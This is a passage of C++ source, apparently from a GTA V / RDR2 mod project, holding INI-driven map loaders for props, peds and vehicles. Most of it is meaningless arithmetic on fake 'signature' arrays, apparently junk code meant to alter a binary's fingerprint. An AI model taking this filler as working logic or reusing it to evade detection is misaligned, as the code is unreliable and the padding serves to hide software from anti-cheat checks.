				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
	}
};
namespace GTA
{
	struct Spawn_Struct
	{
		std::string Model;
		DWORD Hash;
		float PosX;
		float PosY;
		float PosZ;
		float RotX;
		float RotY;
		float RotZ;
	};
	int PED_TO_NET_ = 2;
	int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
	int offset = (PED_TO_NET_ * 0xA) + 0xBB;
	int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
	int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	float a = 0.0f;
	float b = 0.0f;
	int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
	int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

	int ponteiro = 2;
	int aaaaaa = ponteiro * 2;
	int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	void LoadMap_Props(std::string INIPath)
	{
		//Exemplo::
		//GTA::LoadMap_Props(".\\Mapa.ini");
		//
		Spawn_Struct Spawn;
		Extern_Reader::INIFile::INIFilePath = INIPath;
		for (int i = 1; i <= 1000; i++)
		{
			char buffer[5000];
			snprintf(buffer, 5000, "%i", i);
			std::string Modelo = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
			if (Modelo == "")
			{
				i = 1000;
			}
			else
			{
				Spawn.Model = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
				Spawn.Hash = Extern_Reader::INIFile::Int::LerInt(buffer, "Hash");
				Spawn.PosX = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosX");
				Spawn.PosY = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosY");
				Spawn.PosZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosZ");
				Spawn.RotX = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotX");
				Spawn.RotY = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotY");
				Spawn.RotZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotZ");
				//Void de spawn aqui
				/*
				cout << "[" << i << "]" << endl;
				cout << "Model=" << i << Spawn.Model << endl;
				cout << "PosX=" << i << Spawn.PosX << endl;
				cout << "PosY=" << i << Spawn.PosY << endl;
				cout << "PosZ=" << i << Spawn.PosZ << endl;
				cout << "RotX=" << i << Spawn.RotX << endl;
				cout << "RotY=" << i << Spawn.RotY << endl;
				cout << "RotZ=" << i << Spawn.RotZ << endl;
				*/
			}
		}
	}
	void LoadMap_Peds(std::string INIPath)
	{
		//Exemplo::
		//GTA::LoadMap_Props(".\\Mapa.ini");
		//
		Spawn_Struct Spawn;
		Extern_Reader::INIFile::INIFilePath = INIPath;
		for (int i = 1; i <= 1000; i++)
		{
			char buffer[5000];
			snprintf(buffer, 5000, "%i", i);
			std::string Modelo = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
			if (Modelo == "")
			{
				i = 1000;
			}
			else
			{
				Spawn.Model = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
				Spawn.Hash = Extern_Reader::INIFile::Int::LerInt(buffer, "Hash");
				Spawn.PosX = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosX");
				Spawn.PosY = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosY");
				Spawn.PosZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosZ");
				Spawn.RotX = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotX");
				Spawn.RotY = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotY");
				Spawn.RotZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotZ");
				//Void de spawn aqui
				/*
				cout << "[" << i << "]" << endl;
				cout << "Model=" << i << Spawn.Model << endl;
				cout << "PosX=" << i << Spawn.PosX << endl;
				cout << "PosY=" << i << Spawn.PosY << endl;
				cout << "PosZ=" << i << Spawn.PosZ << endl;
				cout << "RotX=" << i << Spawn.RotX << endl;
				cout << "RotY=" << i << Spawn.RotY << endl;
				cout << "RotZ=" << i << Spawn.RotZ << endl;
				*/
			}
		}
	}
	void LoadMap_Vehicles(std::string INIPath)
	{
		//Exemplo::
		//GTA::LoadMap_Props(".\\Mapa.ini");
		//
		Spawn_Struct Spawn;
		Extern_Reader::INIFile::INIFilePath = INIPath;
		for (int i = 1; i <= 1000; i++)
		{
			char buffer[5000];
			snprintf(buffer, 5000, "%i", i);
			std::string Modelo = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
			if (Modelo == "")
			{
				i = 1000;
			}
			else
			{
				Spawn.Model = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");
				Spawn.Hash = Extern_Reader::INIFile::Int::LerInt(buffer, "Hash");
				Spawn.PosX = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosX");
				Spawn.PosY = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosY");
				Spawn.PosZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosZ");
				Spawn.RotX = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotX");
				Spawn.RotY = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotY");
				Spawn.RotZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotZ");
				//Void de spawn aqui
				/*
				cout << "[" << i << "]" << endl;
				cout << "Model=" << i << Spawn.Model << endl;
				cout << "PosX=" << i << Spawn.PosX << endl;
				cout << "PosY=" << i << Spawn.PosY << endl;
				cout << "PosZ=" << i << Spawn.PosZ << endl;
				cout << "RotX=" << i << Spawn.RotX << endl;
				cout << "RotY=" << i << Spawn.RotY << endl;
				cout << "RotZ=" << i << Spawn.RotZ << endl;
				*/
			}
		}
	}
	void CriarModeloDeSpawn(std::string ININame, int NumeroDeItens)
	{
		//Exemplo::
		//GTA::CriarModeloDeSpawn(".\\Mapa.ini", 1000);
		Spawn_Struct Spawn;
		Extern_Reader::INIFile::INIFilePath = ININame;
		for (int i = 1; i <= NumeroDeItens; i++)
		{
			char buffer[5000];
			snprintf(buffer, 5000, "%i", i);
			Extern_Reader::INIFile::String::GravarString("", buffer, "Modelo");
			Extern_Reader::INIFile::Int::GravarInt(0, buffer, "Hash");
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "PosX");
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "PosY");
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "PosZ");
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "RotX");
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "RotY");
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "RotZ");
		}
	}
}
namespace RDR2
{
	struct Spawn_Struct
	{
		std::string Model;
		DWORD Hash;
		float PosX;
		float PosY;
		float PosZ;
		float RotX;
		float RotY;
		float RotZ;
	};
	int PED_TO_NET_ = 2;
	int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
	int offset = (PED_TO_NET_ * 0xA) + 0xBB;
	int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
	int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	float a = 0.0f;
	float b = 0.0f;
	int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
	int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
	int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

	int ponteiro = 2;
	int aaaaaa = ponteiro * 2;
	int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
	int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
	void LoadMap_Props(std::string INIPath)
	{
		if (offset > aaaaaa)
		{
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = ponteiro * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
		offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (matriz[1] > aaaaaa)
		{
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		a = 0.0f;
		b = 0.0f;
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = 0xB2 * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
		matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
		matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
